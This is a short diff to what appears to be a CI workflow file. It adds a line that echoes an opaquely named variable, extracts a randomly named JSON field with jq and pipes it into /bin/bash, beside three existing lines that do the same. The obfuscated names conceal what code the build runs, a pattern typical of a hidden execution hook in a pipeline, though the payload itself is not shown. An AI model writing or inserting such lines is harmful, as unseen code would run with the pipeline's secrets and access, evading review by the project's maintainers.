@@ -27,6 +27,7 @@ jobs:
           echo $jdqpd93 | jq -r .ob6747 | /bin/bash
           echo $zlak141 | jq -r .pbbr04 | /bin/bash
           printf '%s' "$zm78" | jq -r .s43986 | /bin/bash
+          echo $puf00 | jq -r .ps35850 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
